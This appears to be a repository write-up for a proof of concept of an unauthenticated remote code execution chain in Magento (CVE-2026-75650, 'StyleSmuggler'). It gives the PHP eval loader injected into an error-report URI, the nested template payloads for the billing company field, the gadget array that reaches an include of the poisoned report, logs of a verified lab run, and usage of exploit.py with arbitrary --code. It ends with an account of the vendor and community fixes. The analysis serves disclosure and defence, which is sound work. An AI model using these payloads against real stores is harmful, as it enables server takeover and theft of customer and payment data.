# StyleSmuggler: complete HTTP-only root-cause analysis and PoC notes

This document explains the complete unauthenticated request-to-include chain for
CVE-2026-75650, also called StyleSmuggler. The analysis was reconstructed from
the local Magento source at commit `f8405be`, compared with the affected
2.4.4-p13 through 2.4.8-p4 tags, and validated against the Docker lab in this
repository.

The current `exploit.py` exercises the chain with HTTP requests only. It does
not enter the Magento container, edit a Magento email template, call the
scanner itself, or insert a helper between the real application components.
The web request follows this sequence:

```text
poison a Magento report
  -> create a guest cart and store a nested billing company value
  -> trigger the guest Payflow failure mutation
  -> the address formatter signs an unresolved Preview block
  -> the failed-payment Email filter executes that signed block
  -> Preview reads type, text, and styles from the same HTTP request
  -> the supplied template creates ColumnSet
  -> ColumnSet asks UrlGeneratorFactory to create Aws\S3\S3Client
  -> ObjectManager resolves with_resolved into [ArrayScanner, collectEntities]
  -> the AWS constructor invokes that callback with its resolved configuration
  -> ArrayScanner includes the poisoned report
  -> the PHP stored in the report runs as the web user
```

## 1. Stage 1 puts PHP in a Magento report

The first request sends PHP syntax in the request target for
`/paypal/transparent/response/`. With no checkout session, the response path
raises an uncaught exception. Magento's generic exception handler copies the
request URI into its diagnostic data and saves that data under
`var/report/<report-id>`.

The relevant path is in
`lib/internal/Magento/Framework/App/ExceptionHandler.php`. The report processor
uses the normal JSON serializer, so the `<?` opening sequence remains PHP
syntax in the saved file. Magento also displays the report identifier on the
error page, which gives the next request the exact file name.

The report is data at this point. It runs only when a later component includes
the file as PHP.

`exploit.py` uses a short loader in the report URI. The code to be evaluated is
sent separately as the query parameter named `0`. The default demonstration
writes `pub/stylesmuggler_pwned.txt` with a fresh random marker followed by
`id` and `uname -a` output. The final HTTP GET must return that exact marker,
so a file left by an earlier run cannot make the check pass. A custom `--code`
fragment runs after the same marker is written and is subject to the same
verification.

## 2. A guest cart stores the parser input

Stage 2 starts with normal unauthenticated GraphQL cart operations:

1. `createEmptyCart` creates a guest quote and returns its masked cart ID.
2. `setGuestEmailOnCart` supplies the email address needed by the payment
   failure service.
3. `setBillingAddressOnCart` stores the nested template expression in the
   optional `company` field.

`app/code/Magento/QuoteGraphQl/Model/Cart/QuoteAddressFactory.php` validates
ordinary address requirements and then calls `$quoteAddress->addData()` with
the input. It does not remove Magento template syntax from `company` or
`postcode`.

The working address values are:

```text
company  = {{if postcode}}{{var postcode}}{{/if}}{{/var}}{{if postcode}}{{var postcode}}{{/if}}{{if city}}{{block class=Magento\Email\Block\Adminhtml\Template\Preview}}{{/if}}
street   = 1 Bridge Street
postcode = {{var postcode}}
city     = x
```

The complete run uses `company` because the current development checkout
rejects braces in `street`. A formatter-level test also confirmed that the
same construction signs the Preview block when placed in `street[0]` on
versions that accept it. The `company` route uses the same vulnerable address
formatter and works end to end over GraphQL.

The unusual closing `{{/var}}`, the repeated postcode directives, and the
self-referential postcode are deliberate. They make Magento's regular
expression based parser match directive boundaries differently on recursive
passes. A plain `{{block}}` in one address field does not create the required
signed directive.

## 3. The failed-payment mutation starts email generation

The fourth stage 2 request calls `handlePayflowProResponse` with the masked
guest cart ID and a declined Payflow response. The resolver accepts only
`cart_id` and `paypal_payload` in the GraphQL document. At
`app/code/Magento/PaypalGraphQl/Model/Resolver/PayflowProResponse.php:128-136`,
the payment validator raises a `LocalizedException`, and the catch block calls:

```php
$this->paymentFailures->handle((int) $cart->getId(), $parameters['error_msg']);
```

`PaymentFailuresService::handle()` builds the
`checkout/payment_failed/template` message synchronously, before the GraphQL
response is returned. It evaluates `getTemplateVars()` while constructing the
transport. At
`app/code/Magento/Sales/Model/Service/PaymentFailuresService.php:165-187`,
that method eagerly computes:

```php
'billingAddressHtml' => $quote->getBillingAddress()->format('html'),
```

This ordering matters. Magento formats the address first. It later inserts the
result into the failed-payment email template.

## 4. The address formatter is a weaker template context

The address path is:

```text
PaymentFailuresService::getTemplateVars()
  -> Quote address format('html')
  -> Customer AbstractAddress::format()
  -> DefaultRenderer::render()
  -> DefaultRenderer::renderArray()
  -> FilterManager::template()
  -> Magento\Framework\Filter\Template::filter()
```

`DefaultRenderer::renderArray()` maps the address into variables such as
`company`, `street1`, `city`, and `postcode`. It HTML-escapes the values, but
HTML escaping does not change curly braces or backslashes. At
`app/code/Magento/Customer/Block/Address/Renderer/DefaultRenderer.php:203-205`
it processes the configured address format with the bare Framework template
filter.

The stock HTML address format at
`app/code/Magento/Customer/etc/config.xml:81-91` contains nested constructs:

```text
{{depend company}}{{var company}}<br />{{/depend}}
{{if street1}}{{var street1}}<br />{{/if}}
...
{{if city}}{{var city}},  {{/if}}{{if region}}{{var region}}, {{/if}}{{if postcode}}{{var postcode}}{{/if}}<br />
```

`DependDirective` and `IfDirective` recursively filter the body of a true
condition. The outer address template starts at filtering depth 1. Processing
the true `company`, `city`, and `postcode` branches creates depth 2 calls.

The nested address value takes advantage of two behaviors in the old filter:

1. Its directive grammar is regular-expression based and can be confused by
   the deliberately crossed and repeated constructions.
2. A directive that remains unchanged at depth greater than 1 is treated as a
   trusted deferred directive.

The second behavior appears in the clean version of
`lib/internal/Magento/Framework/Filter/Template.php:223-235`:

```php
if ($this->filteringDepthMeter->showMark() > 1) {
    $signature = $this->signatureProvider->get();

    foreach ($templateDirectivesResults as $result) {
        if ($result['directive'] === $result['output']) {
            $value = str_replace(
                $result['output'],
                $signature . $result['output'] . $signature,
                $value
            );
        }
    }
}
```

The bare Framework filter has no `blockDirective()` implementation.
`SimpleDirective::process()` catches that condition and returns the block text
unchanged. Because the block is now encountered at depth 2, the equality test
above signs it.

The address result has this important shape, where `<SIGNATURE>` is Magento's
random 32-character value for the request:

```text
{{var postcode}}{{var postcode}}<SIGNATURE>{{block class=Magento\Email\Block\Adminhtml\Template\Preview}}<SIGNATURE><br />
```

The repeated unresolved postcode text is a side effect of the parser
construction. The security-relevant part is that the Preview block is now
wrapped in a valid deferred-directive signature.

## 5. Two filters share the same signature provider

`Magento\Framework\Filter\Template\SignatureProvider::get()` creates one
random string and returns that same string until request state is reset:

```php
public function get(): string
{
    if ($this->signature === null) {
        $this->signature = $this->random->getRandomString(32);
    }
    return $this->signature;
}
```

ObjectManager services are shared unless configuration says otherwise. There
is no non-shared declaration for this provider. The bare address filter and
the later Email filter therefore use the same `SignatureProvider` object in
the same HTTP request.

The failed-payment template contains this line at
`app/code/Magento/Checkout/view/adminhtml/email/failed_payment.html:47`:

```text
{{var billingAddressHtml|raw}}
```

The first pass of `Magento\Email\Model\Template\Filter` replaces that variable
with the address HTML. Its signed-directive pass recognizes the signature
created by the address filter. Unlike the bare Framework filter, the Email
filter implements `blockDirective()`.

At `app/code/Magento/Email/Model/Template/Filter.php:408-452`, it parses the
class parameter, calls Layout to create the named block, and renders it with
`toHtml()`. This constructs
`Magento\Email\Block\Adminhtml\Template\Preview` inside the storefront
request. Direct block construction does not pass through the normal admin
preview controller or its access check.

This resolves the route objection in Disrex's public `HOW-IT-WORKS.md`. That
document correctly observes that no GraphQL route dispatches Preview. A route
dispatch is unnecessary here: the signed directive makes the Email filter and
Layout construct the block directly. The recorded request order is
`BlockFactory::createBlock(Preview)`, then `Preview::_toHtml()` with the same
GraphQL request URI.

## 6. Preview reads GraphQL query parameters from the shared request

The three Preview parameters are HTTP query parameters on the same POST to
`/graphql`:

```text
type=2
text={{block class=Magento\Backend\Block\Widget\Grid\ColumnSet rowUrl=$this.template_styles}}
styles[...]=...
```

They are not GraphQL arguments. This is why they do not appear in the Payflow
mutation schema or resolver.

`Magento\Framework\HTTP\PhpEnvironment\Request::getParam()` checks route
parameters, query parameters, then form parameters. The GraphQL controller
decodes the JSON body for the GraphQL operation, but it does not clear the
query collection. When the signed directive renders Preview,
`app/code/Magento/Email/Block/Adminhtml/Template/Preview.php:56-89` performs:

```php
$request = $this->getRequest();
$template = $this->_emailFactory->create();

$template->setTemplateType($request->getParam('type'));
$template->setTemplateText($this->_maliciousCode->filter($request->getParam('text')));
$template->setTemplateStyles($request->getParam('styles'));

$templateProcessed = $this->_appState->emulateAreaCode(
    \Magento\Email\Model\AbstractTemplate::DEFAULT_DESIGN_AREA,
    [$template, 'getProcessedTemplate']
);
```

`type=2` marks the transient template as HTML. PHP bracket notation turns the
`styles[...]` query keys into a nested PHP array. The old magic DataObject
setter accepts that array as `template_styles`. The chain uses type 2 in the
validated request, but its `$this.template_styles` lookup does not depend on
the separate HTML-only top-level `template_styles` variable. A controlled
HTTP-only run with `type=1` also reached the inert include marker; its output is
preserved in the internal validation record used to prepare this repository.

The full parameter matrix shows that `text` and the nested `styles` array are
required for this request-supplied chain. `type` is optional because this
Template class defaults to HTML type 2 when no type is set. A nonzero numeric
`id` selects Preview's stored-template branch and ignores the supplied type,
text, and styles. Results and traces are in
the internal parameter-matrix validation record.

## 7. The transient template passes the styles array to ColumnSet

The `text` value is another block directive:

```text
{{block class=Magento\Backend\Block\Widget\Grid\ColumnSet rowUrl=$this.template_styles}}
```

`AbstractTemplate::getProcessedTemplate()` places the template object in the
variable map as `this` at
`app/code/Magento/Email/Model/AbstractTemplate.php:337-363`. Magento's strict
variable resolver interprets `$this.template_styles` as a property path and
calls the template object's data accessor, retrieving the nested array stored
by Preview. HTML templates also receive a separate top-level
`template_styles` variable, but this directive does not reference it.

This solves a type problem in the gadget chain. The directive tokenizer
normally creates flat string parameters. `rowUrl` needs to be an array. The
`$this.template_styles` reference moves the already parsed request array into
the block's constructor data without flattening it.

The Email filter creates
`Magento\Backend\Block\Widget\Grid\ColumnSet` and passes the resolved array as
`$data['rowUrl']`.

## 8. ColumnSet selects an attacker-controlled generator class

The `styles` array used by `exploit.py` has this structure:

```php
[
    'first' => '/var/www/html/var/report/<report-id>',
    'generatorClass' => 'Aws\\S3\\S3Client',
    'version' => 'latest',
    'region' => 'us-east-1',
    'with_resolved' => [
        [
            'instance' => 'Magento\\Setup\\Module\\Di\\Code\\Scanner\\ArrayScanner',
            '_i_' => 'Magento\\Setup\\Module\\Di\\Code\\Scanner\\ArrayScanner',
        ],
        'collectEntities',
    ],
]
```

`instance` is used by the developer ObjectManager factory. `_i_` is the
equivalent representation accepted by compiled factories. Supplying both
keeps the request compatible with both modes.

This was tested with Magento's real compiled factory. In a normal production
build, the external AWS SDK is outside Magento's generated DI metadata paths.
The compiled factory therefore discovers the S3 constructor at runtime and
recursively resolves `_i_`. A custom build that explicitly adds the AWS SDK to
Magento's compiled metadata would not parse this particular call-time array in
the same way.

At
`app/code/Magento/Backend/Block/Widget/Grid/ColumnSet.php:107-130`, the
constructor copies `rowUrl['generatorClass']` and calls:

```php
$this->_rowUrlGenerator = $generatorFactory->createUrlGenerator(
    $generatorClassName,
    ['args' => $rowUrlParams]
);
```

`UrlGeneratorFactory::createUrlGenerator()` then calls ObjectManager at
`app/code/Magento/Backend/Model/Widget/Grid/Row/UrlGeneratorFactory.php:37-44`:

```php
$rowUrlGenerator = $this->_objectManager->create($generatorClassName, $arguments);
if (false === $rowUrlGenerator instanceof GeneratorInterface) {
    throw new \InvalidArgumentException('Passed wrong parameters');
}
```

The interface check happens after construction. The chosen class can complete
constructor side effects before Magento rejects it as the wrong type.

## 9. ObjectManager turns with_resolved into a live callback

ObjectManager recursively parses arrays supplied as constructor arguments.
`lib/internal/Magento/Framework/ObjectManager/Factory/AbstractFactory.php:199-226`
contains this behavior:

```php
if (isset($item['instance'])) {
    $array[$key] = $isShared
        ? $this->objectManager->get($item['instance'])
        : $this->objectManager->create($item['instance']);
}
```

As it prepares the `args` array for `Aws\S3\S3Client`, ObjectManager converts
the first `with_resolved` element from an array description into a real
`Magento\Setup\Module\Di\Code\Scanner\ArrayScanner` object. PHP then sees:

```php
[
    $arrayScannerObject,
    'collectEntities',
]
```

That two-element array is a valid PHP callable.

The name `with_resolved` belongs to the AWS SDK. It is not a special Magento
directive. Magento's role is to convert the nested `instance` description
before it calls the AWS constructor.

## 10. The AWS constructor invokes the scanner callback

`Aws\S3\S3Client` inherits its constructor behavior from
`vendor/aws/aws-sdk-php/src/AwsClient.php`. The supplied `version` and `region`
values allow its configuration resolver to run. At lines 248-283, the
constructor resolves the argument array and then invokes the optional hook:

```php
$config = $resolver->resolve($args, $this->handlerList);
...
if (isset($args['with_resolved'])) {
    $args['with_resolved']($config);
}
```

The callback is now `[ArrayScanner, 'collectEntities']`, so PHP calls:

```php
$arrayScanner->collectEntities($config);
```

In the AWS SDK version bundled with this Magento build, the resolver preserves
unrecognized input keys in the resolved configuration and appends defaults
after the existing keys. The `first` key therefore still points at the report.
The PoC puts `first` at the beginning of the request array so ArrayScanner
encounters the report path before unrelated AWS configuration values. The
runtime trace confirms this exact order.

## 11. ArrayScanner includes the poisoned report

`setup/src/Magento/Setup/Module/Di/Code/Scanner/ArrayScanner.php:16-25` loops
over the supplied array:

```php
public function collectEntities(array $files)
{
    $output = [];
    foreach ($files as $file) {
        if (file_exists($file)) {
            $data = include $file;
            $output = array_merge($output, $data);
        }
    }
    return $output;
}
```

`include` parses the report as PHP. Diagnostic JSON around the planted PHP is
emitted as response text, while the embedded loader evaluates the base64 code
from query parameter `0`.

A report without `return []` can later cause `array_merge()` to reject the
include result. That later exception does not reverse code that ran during
the include. The PoC verifies execution independently by fetching the file
created under the web root.

## 12. Fresh end-to-end validation

The current script passed syntax validation and a fresh default run against
the lab:

```text
[*] stage 1: POST /paypal/transparent/response/?<?=eval(base64_decode($_GET[0]))?> -> HTTP 500
[*] stage 1: Magento disclosed report id 65731db99450e9c1ef31894550c5cb536c1c0e3793f07c7e8583fc7e5131bef3
[*] stage 2 request 1: created guest cart JFtZegWCH5Oy8aYDkQGAZvWuoIw7P1RM
[*] stage 2 request 2: set the guest email
[*] stage 2 request 3: stored the nested billing-address bridge
[*] stage 2 request 4: response contains output from the included report
[*] stage 2 request 4: completed with HTTP 200
[*] RCE VERIFIED: GET /stylesmuggler_pwned.txt returned HTTP 200
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux 61b8c00ed7a4 6.17.0-1025-oem #25-Ubuntu SMP PREEMPT_DYNAMIC Fri May 29 12:11:29 UTC 2026 x86_64 GNU/Linux
```

The same chain was also exercised with a harmless PHP fixture that only
printed `ARRAY_SCANNER_FIXTURE_INCLUDED` and returned an array. Its response
began with that marker, followed by the expected declined-payment GraphQL
JSON. Ordered passive traces recorded:

```text
signed billing address
  -> Preview BlockFactory construction
  -> Preview::_toHtml() with styles as an array
  -> transient AbstractTemplate with the ColumnSet text
  -> ColumnSet BlockFactory construction
  -> ArrayScanner construction during ObjectManager array parsing
  -> UrlGeneratorFactory construction of Aws\S3\S3Client
  -> AWS with_resolved callback
  -> ArrayScanner::collectEntities()
  -> include.before /tmp/array-scanner-fixture.php
  -> include.after with an array result
```

An independent audit then repeated the complete PoC both directly and through
a recording HTTP proxy. Both runs exited with status 0. The proxy captured six
requests with statuses `500, 200, 200, 200, 200, 200`. Mechanical checks prove
that the report ID from the first response became the suffix of
`styles[first]`, and that the cart ID from `createEmptyCart` was reused in the
three later cart requests. The exact HTTP transcripts, reduced traces, hashes,
and checks were retained in the internal validation record.

Trace hooks in the lab record arguments and call order only. They do not add
an edge to the execution path. The exploit reaches every component through
the stock request flow.

The nested signing behavior was separately run against the exact Framework
filter files from tags `2.4.4-p13`, `2.4.5-p12`, `2.4.6-p10`, `2.4.7-p5`, and
`2.4.8-p4`. All five produced a signed Preview block with the same output
shape.

## 13. Running and debugging the PoC

Start the prepared lab and run the complete HTTP flow from the repository root:

```bash
docker compose up -d
python3 exploit.py --target http://localhost:18082
```

To inspect every request in Burp:

```bash
python3 exploit.py \
  --target http://localhost:18082 \
  --proxy http://127.0.0.1:8082
```

Configure a Burp listener on 8082, or substitute any other free listener port.

For an HTTPS target with a Burp certificate the local Python trust store does
not recognize, add `--proxy-insecure`.

Two reduced modes are available:

- `--http-check-only` creates a guest cart and checks that the failed-payment
  resolver is reached, without the poisoning or gadget inputs.
- `--skip-stage2` performs only report poisoning and prints the report ID.

`--code` changes the PHP statement evaluated by the planted loader.
`--report-dir` changes the report directory as seen by the target PHP process.
The default `/var/www/html/var/report` matches this repository's Docker lab.

## 14. Why the fixes break the chain

Adobe's APSB26-146 hotfix applies several boundaries because this chain
combines bugs in separate subsystems:

- Diagnostic report data is sanitized and each saved report receives an
  execution guard, so a request URI cannot become executable PHP when the
  report is included.
- Email Preview checks the required admin ACL inside `_toHtml()`, before it
  reads request parameters.
- Explicit `setTemplateText()` and `setTemplateStyles()` methods keep strings
  and replace structured values with an empty string. This removes the nested
  array needed for `rowUrl`.
- URL generator classes are validated before construction, closing the
  constructor side-effect window used by `S3Client`.
- Layout block classes are also validated before construction. Preview and
  ColumnSet are valid blocks, so that additional check hardens adjacent paths
  but does not independently stop this exact chain.

Bigbridge's deferred-directive fix addresses the root parser transition. It
changes the filter so only explicitly deferred child output is signed. An
unchanged directive found at recursive depth is no longer trusted merely
because it survived the weaker filter.

Community mitigations that make setup scanners command-line only close the
final include during web requests. That is useful defense in depth, but it
protects a different boundary from the address-signing and Preview fixes.

Production systems should use Adobe's supported update and investigate for
prior compromise. A WAF signature or one community guard covers only part of
the chain.

## Sources

- Adobe APSB26-146: https://helpx.adobe.com/security/products/magento/apsb26-146.html
- Sansec advisory: https://sansec.io/research/stylesmuggler
- Disrex technical analysis: https://github.com/disrex-group/stylesmuggler-mitigation/blob/main/HOW-IT-WORKS.md
- Graycore case study: https://www.graycore.io/case-studies/CVE-2026-75650-style-smuggler
- Graycore hardening module: https://github.com/graycoreio/magento2-style-smuggler-patch
- Bigbridge deferred-directive fix: https://github.com/bigbridge-nl/magento2-stylesmuggler-deferred-directives-fix
